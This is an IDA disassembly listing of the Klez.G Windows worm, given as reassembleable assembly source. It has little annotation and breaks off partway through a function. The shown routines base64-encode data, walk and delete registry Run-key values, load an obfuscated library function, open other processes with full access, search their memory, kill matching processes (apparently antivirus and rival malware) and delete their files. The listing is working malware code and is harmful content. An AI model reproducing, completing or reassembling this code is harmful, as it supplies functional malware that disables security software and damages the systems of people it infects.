; [0000001C BYTES. COLLAPSED STRUCT _SERVICE_STATUS. PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES. COLLAPSED STRUCT _cpinfo. PRESS KEYPAD "+" TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT SERVICE_TABLE_ENTRYA. PRESS	KEYPAD "+" TO EXPAND]
; [00000094 BYTES. COLLAPSED STRUCT _OSVERSIONINFOA. PRESS KEYPAD "+" TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT LUID. PRESS	KEYPAD "+" TO EXPAND]
; [0000000C BYTES. COLLAPSED STRUCT LUID_AND_ATTRIBUTES. PRESS KEYPAD "+" TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT _TOKEN_PRIVILEGES. PRESS KEYPAD "+"	TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT _LUID. PRESS KEYPAD	"+" TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT _PROCESS_INFORMATION. PRESS	KEYPAD "+" TO EXPAND]
; [00000044 BYTES. COLLAPSED STRUCT _STARTUPINFOA. PRESS KEYPAD	"+" TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT FILETIME. PRESS KEYPAD "+" TO EXPAND]
; [0000013E BYTES. COLLAPSED STRUCT _WIN32_FIND_DATAA. PRESS KEYPAD "+"	TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT sockaddr. PRESS KEYPAD "+" TO EXPAND]
; [00000190 BYTES. COLLAPSED STRUCT WSAData. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES. COLLAPSED STRUCT _SID_IDENTIFIER_AUTHORITY. PRESS KEYPAD "+"	TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT _SYSTEMTIME. PRESS KEYPAD "+" TO EXPAND]

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2004 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; File Name   :	KLEZ-G
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 0000B6BA (  46778.)
; Section size in file		: 0000C000 (  49152.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?
; OS type	  :  MS	Windows
; Application type:  Executable	32bit
;


unicode		macro page,string,zero
		irpc c,<string>
		db '&c', page
		endm
		ifnb <zero>
		dw zero
		endif
endm

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401000	proc near		; CODE XREF: sub_4040BD+7Ap

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		mov	eax, [ebp+arg_8]
		push	ebx
		push	esi
		xor	esi, esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_14], esi
		mov	[ebp+var_8], esi
		mov	[ebp+var_10], eax

loc_401019:				; CODE XREF: sub_401000+18Cj
		cmp	esi, [ebp+arg_8]
		jge	loc_401191
		mov	eax, [ebp+var_10]
		push	3
		pop	edx
		cmp	eax, edx
		mov	[ebp+var_C], edx
		jge	short loc_401032
		mov	[ebp+var_C], eax

loc_401032:				; CODE XREF: sub_401000+2Dj
		mov	ecx, [ebp+var_C]
		mov	eax, 3D3D3D3Dh
		lea	edi, [ebp+var_4]
		stosw
		test	ecx, ecx
		stosb
		jle	short loc_401059
		mov	eax, [ebp+arg_0]
		lea	edi, [ebp+var_4]
		add	esi, eax
		mov	eax, ecx
		shr	ecx, 2
		rep movsd
		mov	ecx, eax
		and	ecx, edx
		rep movsb

loc_401059:				; CODE XREF: sub_401000+42j
		mov	cl, byte ptr [ebp+var_4]
		mov	al, cl
		shr	al, 2
		test	ebx, ebx
		mov	byte ptr [ebp+var_4+3],	al
		jz	short loc_40108E
		mov	edi, [ebp+arg_C]
		test	edi, edi
		jle	short loc_401096
		mov	eax, ebx
		mov	esi, [ebp+arg_4]
		sub	eax, [ebp+var_8]
		cdq
		idiv	edi
		test	edx, edx
		jnz	short loc_401099
		mov	byte ptr [ebx+esi], 0Dh
		inc	ebx
		mov	byte ptr [ebx+esi], 0Ah
		inc	ebx
		add	[ebp+var_8], 2
		jmp	short loc_401099
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40108E:				; CODE XREF: sub_401000+66j
		mov	esi, [ebp+arg_4]
		mov	edi, [ebp+arg_C]
		jmp	short loc_401099
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401096:				; CODE XREF: sub_401000+6Dj
		mov	esi, [ebp+arg_4]

loc_401099:				; CODE XREF: sub_401000+7Cj
					; sub_401000+8Cj ...
		movzx	eax, byte ptr [ebp+var_4+3]
		mov	edx, dword_40E030
		and	cl, 3
		shl	cl, 4
		mov	al, [eax+edx]
		mov	[ebx+esi], al
		mov	al, byte ptr [ebp+var_4+1]
		mov	dl, al
		inc	ebx
		shr	dl, 4
		add	cl, dl
		test	ebx, ebx
		jz	short loc_4010DF
		test	edi, edi
		jle	short loc_4010DF
		mov	eax, ebx
		sub	eax, [ebp+var_8]
		cdq
		idiv	edi
		test	edx, edx
		jnz	short loc_4010DC
		mov	byte ptr [ebx+esi], 0Dh
		inc	ebx
		mov	byte ptr [ebx+esi], 0Ah
		inc	ebx
		add	[ebp+var_8], 2

loc_4010DC:				; CODE XREF: sub_401000+CCj
		mov	al, byte ptr [ebp+var_4+1]

loc_4010DF:				; CODE XREF: sub_401000+BCj
					; sub_401000+C0j
		mov	edx, dword_40E030
		and	al, 0Fh
		movzx	ecx, cl
		shl	al, 2
		mov	cl, [ecx+edx]
		mov	[ebx+esi], cl
		mov	cl, byte ptr [ebp+var_4+2]
		mov	dl, cl
		inc	ebx
		shr	dl, 6
		add	al, dl
		test	ebx, ebx
		mov	byte ptr [ebp+var_4+3],	al
		jz	short loc_401123
		test	edi, edi
		jle	short loc_401123
		mov	eax, ebx
		sub	eax, [ebp+var_8]
		cdq
		idiv	edi
		test	edx, edx
		jnz	short loc_401123
		mov	byte ptr [ebx+esi], 0Dh
		inc	ebx
		mov	byte ptr [ebx+esi], 0Ah
		inc	ebx
		add	[ebp+var_8], 2

loc_401123:				; CODE XREF: sub_401000+103j
					; sub_401000+107j ...
		movzx	eax, byte ptr [ebp+var_4+3]
		mov	edx, dword_40E030
		mov	al, [eax+edx]
		mov	[ebx+esi], al
		inc	ebx
		cmp	[ebp+var_C], 2
		jg	short loc_40113F
		mov	byte ptr [ebx+esi-1], 3Dh

loc_40113F:				; CODE XREF: sub_401000+138j
		and	cl, 3Fh
		test	ebx, ebx
		jz	short loc_401164
		test	edi, edi
		jle	short loc_401164
		mov	eax, ebx
		sub	eax, [ebp+var_8]
		cdq
		idiv	edi
		test	edx, edx
		jnz	short loc_401164
		mov	byte ptr [ebx+esi], 0Dh
		inc	ebx
		mov	byte ptr [ebx+esi], 0Ah
		inc	ebx
		add	[ebp+var_8], 2

loc_401164:				; CODE XREF: sub_401000+144j
					; sub_401000+148j ...
		movzx	eax, cl
		mov	ecx, dword_40E030
		mov	al, [eax+ecx]
		mov	[ebx+esi], al
		inc	ebx
		cmp	[ebp+var_C], 1
		jg	short loc_40117F
		mov	byte ptr [ebx+esi-1], 3Dh

loc_40117F:				; CODE XREF: sub_401000+178j
		mov	esi, [ebp+var_14]
		add	esi, 3
		sub	[ebp+var_10], 3
		mov	[ebp+var_14], esi
		jmp	loc_401019
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401191:				; CODE XREF: sub_401000+1Cj
		pop	edi
		mov	eax, ebx
		pop	esi
		pop	ebx
		leave
		retn
sub_401000	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401198	proc near		; CODE XREF: sub_4013A9+Ap

Name		= byte ptr -110h
var_C		= dword	ptr -0Ch
dwIndex		= dword	ptr -8
hKey		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 110h
		and	[ebp+dwIndex], 0
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	4
		push	offset aTW@WT@Y@WwYteW ; "ÇÙ]TÕŞWÜ@ÈÚßWÙ×Ù]T@ÅÚY\\ÙÕ×@ÏÔWWÜYTEÜW×Ú"...
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpSubKey
		push	80000002h	; hKey
		call	ds:RegOpenKeyA
		test	eax, eax
		jnz	locret_401282
		push	ebx
		push	esi
		push	edi
		mov	ebx, (offset aTvynEf+6)
		push	eax
		push	ebx
		call	sub_403464
		pop	ecx
		mov	[ebp+var_C], eax
		pop	ecx

loc_4011DF:				; CODE XREF: sub_401198+D9j
		lea	eax, [ebp+Name]
		push	104h		; cbName
		push	eax		; lpName
		push	[ebp+dwIndex]	; dwIndex
		push	[ebp+hKey]	; hKey
		call	ds:RegEnumKeyA
		test	eax, eax
		jnz	short loc_401276
		lea	eax, [ebp+Name]
		push	eax		; char *
		call	__strupr
		xor	edi, edi
		pop	ecx
		cmp	[ebp+var_C], edi
		jle	short loc_40126E

loc_40120F:				; CODE XREF: sub_401198+D4j
		push	edi
		push	ebx
		call	sub_403434
		push	eax
		lea	eax, [ebp+Name]
		push	eax
		call	sub_403B7D
		add	esp, 10h
		test	eax, eax
		jz	short loc_401268
		push	offset LibFileName ; lpLibFileName
		call	ds:LoadLibraryA
		mov	esi, eax
		test	esi, esi
		jz	short loc_401268
		push	2
		push	offset ProcName	; "GÜİÚ×TÜWÇÜWUÚßÜFWÙßÜ××nIÜTÇZŞWÜÎ\\\\nÇJLÜ"...
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax		; lpProcName
		push	esi		; hModule
		call	ds:GetProcAddress
		test	eax, eax
		jz	short loc_401261
		lea	ecx, [ebp+Name]
		push	ecx
		push	[ebp+hKey]
		call	eax

loc_401261:				; CODE XREF: sub_401198+BBj
		push	esi		; hLibModule
		call	ds:FreeLibrary

loc_401268:				; CODE XREF: sub_401198+90j
					; sub_401198+A1j
		inc	edi
		cmp	edi, [ebp+var_C]
		jl	short loc_40120F

loc_40126E:				; CODE XREF: sub_401198+75j
		inc	[ebp+dwIndex]
		jmp	loc_4011DF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401276:				; CODE XREF: sub_401198+61j
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		pop	edi
		pop	esi
		pop	ebx

locret_401282:				; CODE XREF: sub_401198+2Dj
		leave
		retn
sub_401198	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401284	proc near		; CODE XREF: sub_4013A9+2Cp
					; sub_4013A9+49p

Data		= byte ptr -814h
ValueName	= byte ptr -414h
var_14		= dword	ptr -14h
Type		= dword	ptr -10h
cbValueName	= dword	ptr -0Ch
cbData		= dword	ptr -8
dwIndex		= dword	ptr -4
hKey		= dword	ptr  8
phkResult	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 814h
		lea	eax, [ebp+phkResult]
		push	esi
		and	[ebp+dwIndex], 0
		push	eax		; phkResult
		push	[ebp+phkResult]	; lpSubKey
		mov	esi, 400h
		mov	[ebp+cbValueName], esi
		mov	[ebp+cbData], esi
		push	[ebp+hKey]	; hKey
		call	ds:RegOpenKeyA
		test	eax, eax
		jz	short loc_4012B8
		xor	eax, eax
		jmp	loc_4013A4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4012B8:				; CODE XREF: sub_401284+2Bj
		push	ebx
		push	edi
		mov	edi, (offset aTvynEf+6)
		push	0
		push	edi
		call	sub_403464
		pop	ecx
		mov	[ebp+hKey], eax
		pop	ecx

loc_4012CC:				; CODE XREF: sub_401284+10Ej
		lea	eax, [ebp+cbData]
		xor	ebx, ebx
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		lea	eax, [ebp+cbValueName]
		push	ebx		; lpReserved
		push	eax		; lpcbValueName
		lea	eax, [ebp+ValueName]
		mov	[ebp+cbValueName], esi
		push	eax		; lpValueName
		mov	[ebp+cbData], esi
		push	[ebp+dwIndex]	; dwIndex
		push	[ebp+phkResult]	; hKey
		call	ds:RegEnumValueA
		test	eax, eax
		jnz	loc_401397
		cmp	[ebp+Type], 1
		jz	short loc_40130F
		and	[ebp+Data], al

loc_40130F:				; CODE XREF: sub_401284+83j
		lea	eax, [ebp+ValueName]
		push	eax		; char *
		call	__strupr
		lea	eax, [ebp+Data]
		push	eax		; char *
		call	__strupr
		cmp	[ebp+hKey], 0
		pop	ecx
		pop	ecx
		jle	short loc_40138F

loc_40132F:				; CODE XREF: sub_401284+109j
		push	ebx
		push	edi
		call	sub_403434
		mov	[ebp+var_14], eax
		push	eax
		lea	eax, [ebp+ValueName]
		push	eax
		call	sub_403B7D
		add	esp, 10h
		test	eax, eax
		jnz	short loc_401379
		push	[ebp+var_14]
		lea	eax, [ebp+Data]
		push	eax
		call	sub_403B7D
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_401379
		lea	eax, [ebp+ValueName]
		push	offset a@	; char *
		push	eax		; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_401389

loc_401379:				; CODE XREF: sub_401284+C7j
					; sub_401284+DCj
		lea	eax, [ebp+ValueName]
		push	eax		; lpValueName
		push	[ebp+phkResult]	; hKey
		call	ds:RegDeleteValueA

loc_401389:				; CODE XREF: sub_401284+F3j
		inc	ebx
		cmp	ebx, [ebp+hKey]
		jl	short loc_40132F

loc_40138F:				; CODE XREF: sub_401284+A9j
		inc	[ebp+dwIndex]
		jmp	loc_4012CC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401397:				; CODE XREF: sub_401284+79j
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey
		pop	edi
		xor	eax, eax
		pop	ebx

loc_4013A4:				; CODE XREF: sub_401284+2Fj
		pop	esi
		leave
		retn	8
sub_401284	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4013A9	proc near		; CODE XREF: sub_4015FF+39p

var_200		= dword	ptr -200h

		push	ebp
		mov	ebp, esp
		sub	esp, 200h
		push	esi
		call	sub_401198
		lea	eax, [ebp+var_200]
		push	2
		push	eax
		call	sub_403BD8
		pop	ecx
		lea	eax, [ebp+var_200]
		pop	ecx
		mov	esi, 80000002h
		push	eax
		push	esi
		call	sub_401284
		lea	eax, [ebp+var_200]
		push	6
		push	eax
		call	sub_403BD8
		pop	ecx
		lea	eax, [ebp+var_200]
		pop	ecx
		push	eax
		push	esi
		call	sub_401284
		pop	esi
		leave
		retn
sub_4013A9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4013FA	proc near		; CODE XREF: sub_4015FF+99p
					; sub_4015FF+E0p ...

var_44C		= dword	ptr -44Ch
Filename	= byte ptr -444h
var_340		= dword	ptr -340h
dwProcessId	= dword	ptr -338h
lpBaseAddress	= dword	ptr -32Ch
var_328		= dword	ptr -328h
var_220		= byte ptr -220h
var_11C		= byte ptr -11Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
hObject		= dword	ptr -0Ch
NumberOfBytesRead= dword ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 444h
		push	ebx
		push	offset aI	; char *
		call	_strlen
		xor	ebx, ebx
		mov	[esp+44Ch+var_44C], (offset aYYTyXxnYtWyTTY+3Ch)
		push	ebx
		mov	[ebp+var_14], eax
		call	sub_40530F
		push	ebx
		push	offset unk_40FBA1
		call	sub_403464
		add	esp, 10h
		mov	[ebp+var_4], eax
		lea	eax, [ebp+Filename]
		push	104h		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		push	[ebp+arg_0]
		mov	[ebp+var_340], 224h
		push	8
		call	CreateToolhelp32Snapshot
		lea	ecx, [ebp+var_340]
		mov	[ebp+var_18], eax
		push	ecx
		push	eax
		call	Module32First
		test	eax, eax
		jz	loc_4015EF
		lea	eax, [ebp+var_220]
		push	eax		; char *
		lea	eax, [ebp+var_11C]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_11C]
		push	eax
		lea	eax, [ebp+Filename]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 10h
		test	eax, eax
		jz	loc_4015EF
		push	[ebp+dwProcessId] ; dwProcessId
		push	ebx		; bInheritHandle
		push	1F0FFFh		; dwDesiredAccess
		call	ds:OpenProcess
		cmp	eax, ebx
		mov	[ebp+hObject], eax
		jz	loc_4015EF
		push	esi
		mov	esi, 80000h
		push	edi
		push	esi		; size_t
		mov	edi, offset Buffer
		push	ebx		; int
		push	edi		; void *
		call	_memset
		mov	eax, [ebp+var_328]
		add	esp, 0Ch
		cmp	eax, esi
		jb	short loc_4014E1
		mov	eax, esi

loc_4014E1:				; CODE XREF: sub_4013FA+E3j
		cmp	[ebp+arg_4], ebx
		mov	[ebp+NumberOfBytesRead], ebx
		jnz	short loc_401506
		lea	ecx, [ebp+NumberOfBytesRead]
		push	ecx		; lpNumberOfBytesRead
		push	eax		; nSize
		push	edi		; lpBuffer
		push	[ebp+lpBaseAddress] ; lpBaseAddress
		push	[ebp+hObject]	; hProcess
		call	ds:ReadProcessMemory
		test	eax, eax
		jz	loc_4015E1

loc_401506:				; CODE XREF: sub_4013FA+EDj
		cmp	[ebp+var_4], ebx
		mov	[ebp+arg_0], ebx
		jbe	loc_4015E1

loc_401512:				; CODE XREF: sub_4013FA+1E1j
		push	[ebp+arg_0]
		push	offset unk_40FBA1
		call	sub_403434
		push	eax		; char *
		mov	[ebp+var_10], eax
		call	_strlen
		xor	esi, esi
		add	esp, 0Ch
		cmp	[ebp+arg_4], esi
		mov	ebx, eax
		jz	short loc_40153C
		lea	eax, [ebx+6Eh]
		mov	[ebp+NumberOfBytesRead], eax
		jmp	short loc_40153F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40153C:				; CODE XREF: sub_4013FA+138j
		mov	eax, [ebp+NumberOfBytesRead]

loc_40153F:				; CODE XREF: sub_4013FA+140j
		sub	eax, ebx
		sub	eax, 0Ah
		jz	loc_4015D2

loc_40154A:				; CODE XREF: sub_4013FA+18Dj
		push	[ebp+var_14]	; size_t
		lea	edi, Buffer[esi]
		push	edi		; char *
		push	offset aI	; char *
		call	__strnicmp
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_4015CB
		cmp	[ebp+arg_4], 0
		jnz	short loc_40158B
		push	ebx		; size_t
		push	edi		; char *
		push	[ebp+var_10]	; char *
		call	__strnicmp
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_40158B
		mov	eax, [ebp+NumberOfBytesRead]
		inc	esi
		sub	eax, ebx
		sub	eax, 0Ah
		cmp	esi, eax
		jb	short loc_40154A
		jmp	short loc_4015D2
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40158B:				; CODE XREF: sub_4013FA+16Fj
					; sub_4013FA+180j
		push	0		; uExitCode
		push	[ebp+hObject]	; hProcess
		call	ds:TerminateProcess
		push	32h		; dwMilliseconds
		call	ds:Sleep
		push	1
		push	(offset	aYYTyXxnYtWyTTY+28h)
		call	sub_403434
		push	eax
		lea	eax, [ebp+var_11C]
		push	eax
		call	sub_403B7D
		add	esp, 10h
		test	eax, eax
		jnz	short loc_4015CB
		lea	eax, [ebp+var_11C]
		push	eax
		call	sub_403DFA
		pop	ecx

loc_4015CB:				; CODE XREF: sub_4013FA+169j
					; sub_4013FA+1C2j
		mov	eax, [ebp+var_4]
		inc	eax
		mov	[ebp+arg_0], eax

loc_4015D2:				; CODE XREF: sub_4013FA+14Aj
					; sub_4013FA+18Fj
		inc	[ebp+arg_0]
		mov	eax, [ebp+arg_0]
		cmp	eax, [ebp+var_4]
		jb	loc_401512

loc_4015E1:				; CODE XREF: sub_4013FA+106j
					; sub_4013FA+112j
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		push	1
		pop	ebx
		pop	edi
		pop	esi

loc_4015EF:				; CODE XREF: sub_4013FA+70j
					; sub_4013FA+A1j ...
		push	[ebp+var_18]	; hObject
		call	ds:CloseHandle
		mov	eax, ebx
		pop	ebx
		leave
		retn	8
sub_4013FA	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_4015FF(LPVOID)
sub_4015FF	proc near		; DATA XREF: sub_406F66+15o

var_238		= byte ptr -238h
var_134		= dword	ptr -134h
var_12C		= dword	ptr -12Ch
var_110		= byte ptr -110h
hObject		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 238h
		push	ebx
		push	esi
		push	edi
		push	5Fh
		pop	esi
		xor	ebx, ebx
		push	ebx
		push	(offset	aTvynEf+6)
		call	sub_403464
		pop	ecx
		mov	[ebp+var_4], eax
		pop	ecx

loc_401620:				; CODE XREF: sub_4015FF+147j
		lea	eax, [esi+1]
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		push	0Ah
		pop	ecx
		mov	eax, edx
		mov	[ebp+var_8], eax
		cdq
		idiv	ecx
		test	edx, edx
		jnz	short loc_40163D
		call	sub_4013A9

loc_40163D:				; CODE XREF: sub_4015FF+37j
		push	ebx
		push	2
		mov	[ebp+var_134], 128h
		call	CreateToolhelp32Snapshot
		lea	ecx, [ebp+var_134]
		mov	[ebp+hObject], eax
		push	ecx
		push	eax
		call	Process32First

loc_40165F:				; CODE XREF: sub_4015FF+10Aj
		test	eax, eax
		jz	loc_40170E
		lea	eax, [ebp+var_238]
		push	ebx		; char *
		push	eax		; char *
		push	ebx		; char *
		lea	eax, [ebp+var_110]
		push	ebx		; char *
		push	eax		; char *
		call	__splitpath
		lea	eax, [ebp+var_238]
		push	eax		; char *
		call	__strupr
		add	esp, 18h
		cmp	[ebp+var_8], ebx
		jnz	short loc_40169D
		push	ebx
		push	[ebp+var_12C]
		call	sub_4013FA

loc_40169D:				; CODE XREF: sub_4015FF+90j
		xor	edi, edi
		xor	esi, esi
		cmp	[ebp+var_4], ebx
		jle	short loc_4016F4

loc_4016A6:				; CODE XREF: sub_4015FF+EFj
		push	esi
		push	(offset	aTvynEf+6)
		call	sub_403434
		push	eax
		lea	eax, [ebp+var_238]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 10h
		test	eax, eax
		jnz	short loc_4016EA
		mov	eax, [ebp+var_4]
		dec	eax
		cmp	esi, eax
		jnz	short loc_4016D5
		cmp	dword_491F08, ebx
		jz	short loc_4016EA

loc_4016D5:				; CODE XREF: sub_4015FF+CCj
		push	1
		pop	edi
		push	edi
		push	[ebp+var_12C]
		call	sub_4013FA
		mov	dword_40FFEC, edi

loc_4016EA:				; CODE XREF: sub_4015FF+C4j
					; sub_4015FF+D4j
		inc	esi
		cmp	esi, [ebp+var_4]
		jl	short loc_4016A6
		cmp	edi, ebx
		jnz	short loc_4016FA

loc_4016F4:				; CODE XREF: sub_4015FF+A5j
		mov	dword_40FFEC, ebx

loc_4016FA:				; CODE XREF: sub_4015FF+F3j
		lea	eax, [ebp+var_134]
		push	eax
		push	[ebp+hObject]
		call	Process32Next
		jmp	loc_40165F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40170E:				; CODE XREF: sub_4015FF+62j
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		cmp	dword_491EF8, ebx
		jz	short loc_40173B
		push	offset FileName
		push	offset unk_4919E4
		push	offset unk_491AE8
		push	80000002h
		call	sub_404540
		add	esp, 10h

loc_40173B:				; CODE XREF: sub_4015FF+11Ej
		push	64h		; dwMilliseconds
		call	ds:Sleep
		mov	esi, [ebp+var_8]
		jmp	loc_401620
sub_4015FF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40174B	proc near		; CODE XREF: sub_403944+13p
					; sub_403D58+9p ...
		mov	eax, ecx
		retn
sub_40174B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40174E	proc near		; CODE XREF: sub_403944+2Bp
					; sub_403D58+1Ap ...

dwDesiredAccess	= dword	ptr -8
FileSizeHigh	= dword	ptr -4
lpFileName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
